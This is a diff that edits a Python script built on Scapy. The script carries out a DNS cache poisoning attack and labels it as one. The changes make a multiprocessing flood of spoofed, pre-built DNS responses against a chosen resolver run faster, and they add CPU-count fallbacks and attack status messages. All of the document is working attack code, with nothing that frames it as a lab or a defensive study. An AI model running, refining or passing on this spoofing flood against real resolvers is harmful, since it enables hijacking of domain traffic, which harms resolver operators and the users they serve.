@@ -11,10 +11,11 @@ conf.verb = 0
 def spoof_worker(args):
     """
     Worker function for a single process.
-    Receives a pre-built DNS payload and sends a specified number of packets.
+    Receives a pre-built DNS payload and sends a specified number of packets in a tight loop.
     """
     resolver_ip, real_ns_ip, dns_payload, num_packets_to_send = args
 
+    # This loop is now inside the worker, making it much more efficient.
     for _ in range(num_packets_to_send):
         # The only work done in this hot loop is creating the fast IP/UDP layers
         # and randomizing the necessary fields.
@@ -41,7 +42,6 @@ def run_attack(resolver_ip, attacker_ip, real_ns_ip, target_domain, num_requests
         send(query_packet)
 
     # --- Pre-craft the constant part of the DNS response ---
-    # This is the key optimization: we do the expensive part only once.
     dns_payload = DNS(
         qr=1, aa=1,
         qd=DNSQR(qname=random_subdomain),
@@ -53,8 +53,12 @@ def run_attack(resolver_ip, attacker_ip, real_ns_ip, target_domain, num_requests
     # --- Multiprocessing Flood ---
     print(f"[*]   Flooding with {num_responses} spoofed responses using multiprocessing...")
     
-    # Use all available CPU cores for the attack
+    # Determine the number of processes (one per CPU core)
     num_processes = multiprocessing.cpu_count()
+    if num_processes == 0: # Fallback for safety
+        num_processes = 2
+
+    # Calculate how many packets each process should send
     packets_per_process = num_responses // num_processes
     
     # Create a list of arguments for each worker process
@@ -89,10 +93,17 @@ def main():
     parser.add_argument("--responses", type=int, default=500, help="Number of spoofed responses per try.")
     args = parser.parse_args()
 
+    # Determine the number of CPU cores to use
+    try:
+        cpu_cores = multiprocessing.cpu_count()
+        if cpu_cores == 0: cpu_cores = 2 # Fallback
+    except NotImplementedError:
+        cpu_cores = 2 # Fallback for systems where it's not detectable
+
     print("\n--- DNS Cache Poisoning Attack Starting ---")
     print(f"[+] Target Domain: {args.domain}")
     print(f"[+] Target Resolver: {args.resolver}")
-    print(f"[+] Using {multiprocessing.cpu_count()} CPU cores for the attack.")
+    print(f"[+] Using {cpu_cores} CPU cores for the attack.")
     print("-------------------------------------------\n")
 
     for i in range(args.tries):
